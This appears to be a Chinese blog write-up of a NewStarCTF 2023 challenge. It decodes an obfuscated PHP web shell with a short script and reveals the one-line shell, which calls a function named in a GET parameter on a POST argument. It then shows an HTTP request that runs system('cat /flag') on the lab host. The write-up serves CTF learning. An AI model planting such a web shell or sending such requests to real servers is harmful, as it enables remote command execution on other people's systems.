---
title: NewStarCTF 2023 WebShell的利用
date: 2023-10-24
categories:
  - CTF
  - Misc
tags:
  - WebShell
---

> 这是一道 Misc & Web 的融合题

## 前置工作

下载 `index.php` 附件，发现形如 `str_rot13(convert_uudecode(str_rot13(base64_decode($txt))));` 的内容，手动解码，发现是个套娃，所以可以编写如下脚本

```php
<?php
$text = "xxxxxx"; // index.php 中的那一大串，把开头的 <?php 手动去掉

function operate($txt) {
    return str_rot13(convert_uudecode(str_rot13(base64_decode($txt))));
}

for ($i=0; $i<10; $i++) {
    $array = explode("('", $text);
    $array = explode("')", $array[1]);
    $text = operate($array[0]);
}

echo $text;
```

最后得出的结果是

```
error_reporting(0);($_GET['7d67973a'])($_POST['9fa3']);
```

## 编写 Http 请求

如上可知这是一个 PHP 中函数的链式调用，其中 `$_GET['7d67973a']` 传入的是函数名（如 `system`），而 `$_POST['9fa3']` 是函数的参数（比如 `cat /flag`），于是我们可以编写如下 Http 请求

```http
POST /?7d67973a=system HTTP/1.1
Host: 11cf285b-1978-495b-8aae-a39aad62fbc6.node4.buuoj.cn:81
User-Agent: Apifox/1.0.0 (https://apifox.com)
Accept: */*
Host: 11cf285b-1978-495b-8aae-a39aad62fbc6.node4.buuoj.cn:81
Connection: keep-alive
Content-Length: 18

9fa3=cat%20%2Fflag
```

最后可以得出 Flag 为 `flag{0321a282-0a95-4669-bbf2-1021ed0c1ebc}`